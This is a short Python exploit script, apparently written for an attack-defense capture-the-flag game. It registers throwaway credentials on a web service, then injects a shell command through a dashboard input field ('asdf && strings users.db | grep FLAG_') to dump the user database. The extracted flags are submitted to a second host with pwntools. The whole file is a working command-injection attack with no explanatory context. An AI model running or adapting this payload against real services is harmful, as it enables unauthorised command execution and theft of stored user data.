import requests
import random
import string
import pwn

def generate_credentials():
    """Generate a random 6-character username and password"""
    characters = string.ascii_letters + string.digits
    
    username = ''.join(random.choice(characters) for _ in range(6))
    password = ''.join(random.choice(characters) for _ in range(6))
    
    return username, password

ip = "10.32.1.2"
port = 5000

s = requests.Session()
u,p = generate_credentials()
r = s.post(f"http://{ip}:{port}/register", data={"username": u, "password": p, "message": "asdf"})
r = s.post(f"http://{ip}:{port}/login", data={"username": u, "password": p, "message": "asdf"})
r = s.post(f"http://{ip}:{port}/dashboard", data={"input_text": "asdf && strings users.db | grep FLAG_"})
flags = r.text.split("FLAG_")[1:]
p = pwn.remote("10.32.1.1", 6666)
for flag in flags:
    p.sendline(("FLAG_" + flag.split()[0]).encode())
    print(p.recv())
p.close()
